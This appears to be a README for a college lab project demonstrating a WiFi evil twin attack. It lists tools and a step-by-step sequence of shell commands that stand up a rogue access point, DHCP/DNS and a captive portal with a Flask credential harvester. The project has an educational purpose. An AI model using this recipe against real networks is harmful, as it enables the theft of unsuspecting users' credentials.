# Social-Engineering: WiFi Spoofing (Evil Twin) Attack
This repository contains a college project demonstrating a WiFi Spoofing (Evil Twin) Attack. The goal was to simulate how a malicious access point in a public setting (like an airport or café) can redirect users to a captive portal to intercept credentials.

⚠️ **Ethical Hacking Disclaimer**
This project is for educational and research purposes ONLY. It was conducted in a controlled lab environment on test devices. These techniques should not be used for any malicious or illegal activities. Understanding these attacks is key to building stronger network defenses.

**Project Overview**:
This demonstration uses a USB WiFi adapter to create a malicious wireless access point. When a user connects to the fake WiFi network, they are assigned an IP address by a custom DHCP/DNS server and then redirected to a fake login page hosted on a Python Flask server. After the user submits their "credentials," they are granted internet access, unaware their information has been captured.

## Technologies Used

Hardware: ALFA AWUS036ACS --> USB WiFi adapter capable of access point mode

Hotspot: hostapd --> Used to create the malicious wireless hotspot

DNS & DHCP: dnsmasq --> Assigns IP addresses to connecting devices and handles DNS requests

Captive Portal: Nodogsplash --> Used to redirects all new connections to fake login page

Phishing Server: Flask (Python) --> Python web framework used to host the fake login page and credential harvester

Network Management: iptables, sysctl, iw --> Linux kernel utilities to manage packet forwarding and network address translation

Environment: Kali Linux

## Commands Used:
sudo ip link set wlan0 down ----------> Set USB adapter interface down

sudo iw dev wlan0 set type __ap ----------> Set adapter to be in access point mode for our hotspot

sudo ip link set wlan0 up ----------> Set USB adapter interface up

sudo ip addr flush dev wlan0 ----------> Clear out any IP address associated to our adapter interface

sudo ip addr add 10.10.0.1/24 dev wlan0 ----------> Add 10.10.0.1 IP address to our USB adapter interface

sudo hostapd hostapd.conf ----------> Start up our WiFi hotspot

sudo dnsmasq -C dnsmasq.conf ----------> Launch our DNS and DHCP server

sudo sysctl -w net.ipv4.ip_forward=1 ----------> Enable IP forwarding for router to forward packets

sudo iptables -P FORWARD ACCEPT ----------> Update Linux kernel firewall to accept forwarding traffic

sudo python3 PhishingServer2.py ----------> Launch our Flask web server with credential harvester

sudo nodogsplash ----------> Launch our captive portal webpage
